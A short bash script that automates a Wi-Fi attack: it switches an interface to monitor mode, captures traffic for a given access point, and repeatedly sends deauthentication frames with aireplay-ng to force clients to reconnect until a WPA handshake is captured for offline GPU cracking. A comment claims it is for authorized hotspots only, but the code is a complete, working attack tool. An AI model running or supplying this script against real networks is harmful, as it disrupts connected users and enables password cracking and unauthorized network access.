#!/bin/bash
# Timed 4-way-handshake capture window on an AUTHORIZED hotspot (own gear / sanctioned only).
# Grabs the handshake from a deauth of a connected client OR a NEW client associating in the window.
# Capture only — cracking is done on the Mac GPU afterwards (crack-mac.sh). Usage: wincap.sh [BSSID] [chan] [secs]
B="${1:-AA:BB:CC:DD:EE:FF}"; CH="${2:-6}"; SECS="${3:-140}"; IF=wlan0
sudo pkill -9 airodump-ng aireplay-ng 2>/dev/null; sleep 1
sudo rm -f /tmp/cap* 2>/dev/null
sudo ip link set $IF down 2>/dev/null; sudo iw dev $IF set type monitor 2>/dev/null; sudo ip link set $IF up 2>/dev/null
sudo iw dev $IF set channel "$CH" 2>/dev/null
echo "capturing on ch$CH, bssid $B, ${SECS}s window…"
sudo airodump-ng -c "$CH" --bssid "$B" -w /tmp/cap "$IF" >/dev/null 2>&1 &
AD=$!
for r in $(seq 1 $((SECS/6))); do
  sudo timeout 2 aireplay-ng --deauth 2 -a "$B" "$IF" >/dev/null 2>&1   # nudge any connected client
  sleep 4
  sudo aircrack-ng /tmp/cap-01.cap 2>/dev/null | grep -q "1 handshake" && { echo "GOT_HANDSHAKE at round $r"; break; }
done
sudo kill $AD 2>/dev/null; sleep 1
if sudo aircrack-ng /tmp/cap-01.cap 2>/dev/null | grep -q "1 handshake"; then
  echo "RESULT=HANDSHAKE_CAPTURED file=/tmp/cap-01.cap"
else
  echo "RESULT=NO_HANDSHAKE (no device connected/associated to the hotspot during the window)"
fi
